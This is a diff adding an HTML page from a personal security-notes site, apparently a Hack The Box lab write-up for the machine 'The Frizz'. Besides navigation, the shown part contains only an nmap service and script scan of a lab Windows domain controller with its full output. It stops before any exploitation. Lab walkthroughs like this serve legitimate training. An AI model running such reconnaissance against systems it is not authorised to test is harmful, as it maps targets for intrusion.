@@ -1,0 +1,1187 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Updown" href="../updown/updown.html" /><link rel="prev" title="Shared" href="../shared/shared.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>The Frizz - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=8f2a1f02" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/active-directory-enum-and-attacks/active-directory-enum-and-attacks.html">Active Directory Enum and Attacks</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/vintage/vintage.html">Vintage</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="../administrator/administrator.html">Administrator</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../shared/shared.html">Shared</a></li>
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">The Frizz</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/code/code.html">Code</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/dog/dog.html">Dog</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/escapetwo/escapetwo.html">Escape Two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <section id="the-frizz">
+<h1>The Frizz<a class="headerlink" href="#the-frizz" title="Permalink to this heading">#</a></h1>
+<p><img alt="thefrizz.png" src="../../../../_images/thefrizz.png" /></p>
+<section id="initial-enumeration">
+<h2>Initial Enumeration<a class="headerlink" href="#initial-enumeration" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.129.58.161<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.initial
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-03-16<span class="w"> </span><span class="m">20</span>:33<span class="w"> </span>GMT
+Stats:<span class="w"> </span><span class="m">0</span>:00:20<span class="w"> </span>elapsed<span class="p">;</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>hosts<span class="w"> </span>completed<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>up<span class="o">)</span>,<span class="w"> </span><span class="m">1</span><span class="w"> </span>undergoing<span class="w"> </span>Script<span class="w"> </span>Scan
+NSE<span class="w"> </span>Timing:<span class="w"> </span>About<span class="w"> </span><span class="m">98</span>.26%<span class="w"> </span><span class="k">done</span><span class="p">;</span><span class="w"> </span>ETC:<span class="w"> </span><span class="m">20</span>:34<span class="w"> </span><span class="o">(</span><span class="m">0</span>:00:00<span class="w"> </span>remaining<span class="o">)</span>
+Stats:<span class="w"> </span><span class="m">0</span>:00:22<span class="w"> </span>elapsed<span class="p">;</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>hosts<span class="w"> </span>completed<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>up<span class="o">)</span>,<span class="w"> </span><span class="m">1</span><span class="w"> </span>undergoing<span class="w"> </span>Script<span class="w"> </span>Scan
+NSE<span class="w"> </span>Timing:<span class="w"> </span>About<span class="w"> </span><span class="m">98</span>.41%<span class="w"> </span><span class="k">done</span><span class="p">;</span><span class="w"> </span>ETC:<span class="w"> </span><span class="m">20</span>:34<span class="w"> </span><span class="o">(</span><span class="m">0</span>:00:00<span class="w"> </span>remaining<span class="o">)</span>
+Stats:<span class="w"> </span><span class="m">0</span>:00:22<span class="w"> </span>elapsed<span class="p">;</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>hosts<span class="w"> </span>completed<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>up<span class="o">)</span>,<span class="w"> </span><span class="m">1</span><span class="w"> </span>undergoing<span class="w"> </span>Script<span class="w"> </span>Scan
+NSE<span class="w"> </span>Timing:<span class="w"> </span>About<span class="w"> </span><span class="m">98</span>.41%<span class="w"> </span><span class="k">done</span><span class="p">;</span><span class="w"> </span>ETC:<span class="w"> </span><span class="m">20</span>:34<span class="w"> </span><span class="o">(</span><span class="m">0</span>:00:00<span class="w"> </span>remaining<span class="o">)</span>
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.129.58.161
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.051s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">986</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
+PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
+<span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh<span class="w">           </span>OpenSSH<span class="w"> </span>for_Windows_9.5<span class="w"> </span><span class="o">(</span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="m">53</span>/tcp<span class="w">   </span>open<span class="w">  </span>domain<span class="w">        </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
+<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">          </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.58<span class="w"> </span><span class="o">(</span>OpenSSL/3.1.3<span class="w"> </span>PHP/8.2.12<span class="o">)</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>Did<span class="w"> </span>not<span class="w"> </span>follow<span class="w"> </span>redirect<span class="w"> </span>to<span class="w"> </span>http://frizzdc.frizz.htb/home/
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.58<span class="w"> </span><span class="o">(</span>Win64<span class="o">)</span><span class="w"> </span>OpenSSL/3.1.3<span class="w"> </span>PHP/8.2.12
+<span class="m">88</span>/tcp<span class="w">   </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2025</span>-03-17<span class="w"> </span><span class="m">03</span>:34:00Z<span class="o">)</span>
+<span class="m">135</span>/tcp<span class="w">  </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">139</span>/tcp<span class="w">  </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
+<span class="m">389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>frizz.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="m">445</span>/tcp<span class="w">  </span>open<span class="w">  </span>microsoft-ds?
+<span class="m">464</span>/tcp<span class="w">  </span>open<span class="w">  </span>kpasswd5?
+<span class="m">593</span>/tcp<span class="w">  </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<span class="m">636</span>/tcp<span class="w">  </span>open<span class="w">  </span>tcpwrapped
+<span class="m">3268</span>/tcp<span class="w"> </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>frizz.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="m">3269</span>/tcp<span class="w"> </span>open<span class="w">  </span>tcpwrapped
+<span class="m">5985</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+Service<span class="w"> </span>Info:<span class="w"> </span>Hosts:<span class="w"> </span>localhost,<span class="w"> </span>FRIZZDC<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+
+Host<span class="w"> </span>script<span class="w"> </span>results:
